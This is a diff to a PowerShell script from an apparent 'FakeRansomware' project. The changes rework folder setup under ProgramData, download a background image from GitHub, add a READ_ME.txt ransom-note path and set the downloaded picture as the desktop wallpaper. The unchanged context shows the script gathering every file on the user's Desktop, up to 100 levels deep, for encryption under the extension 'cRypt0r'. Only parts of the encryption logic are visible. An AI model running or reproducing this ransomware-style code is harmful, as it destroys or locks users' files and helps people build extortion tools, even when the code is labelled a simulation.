@@ -2,24 +2,19 @@
 
 #Prepare system
 
-
     #Create folders
-    $folder_base =  "$env:ProgramData\FakeRan\"
-    $folder_wallpaper = "$folder\Wallpaper"
-    mkdir $folder_wallpaper -ea ignore | Out-Null
-
-
-    Start-Job -Name DownloadWallpaper -ScriptBlock { Invoke-WebRequest "https://i.ibb.co/NKqvy6s/Hardware-manufacturer-Gigabyte-affected-by-ransomware-attack.jpg" -o "C:\wallpaper\skiniw.jpg" } | out-null
-    Wait-Job -Name DownloadWallpaper | out-null
-    $loc = "C:\wallpaper\skiniw.jpg"
-
+    $folder_base =  "$env:ProgramData\andreas6920\"
+        mkdir $folder_base -ea ignore | Out-Null
+    $wallpaper = "$folder_base\Wallpaper.jpg"
+    $note = "$folder_base\READ_ME.txt"
+  
+    Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/Background.jpg" -o $wallpaper
 
 
 #File encryption
 $targetdir = [Environment]::GetFolderPath("Desktop")
 $backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
 $files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
-$part1 = Split-Path $files;
 $fileextension = "cRypt0r"
 
 
@@ -50,23 +45,6 @@ Add-Content -Path $path -Value $encryptedcontent
 #Wallpaper
 Function Set-WallPaper {
 
-<#
-
-.SYNOPSIS
-Applies a specified wallpaper to the current user's desktop
-
-.PARAMETER Image
-Provide the exact path to the image
-
-.PARAMETER Style
-Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
-
-.EXAMPLE
-Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
-Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
-
-#>
-
 param (
 [parameter(Mandatory=$True)]
 # Provide path to image
@@ -184,12 +162,7 @@ $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni
 }
 
 
-Start-Job -Name DownloadWallpaper -ScriptBlock { Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/Background.jpg" -o "C:\wallpaper\skiniw.jpg" } | out-null
-Wait-Job -Name DownloadWallpaper | out-null
-$loc = "C:\wallpaper\skiniw.jpg"
-
-
-Set-WallPaper -Image $loc -Style Stretch
+Set-WallPaper -Image $wallpaper -Style Stretch | Out-Null
 
 
 
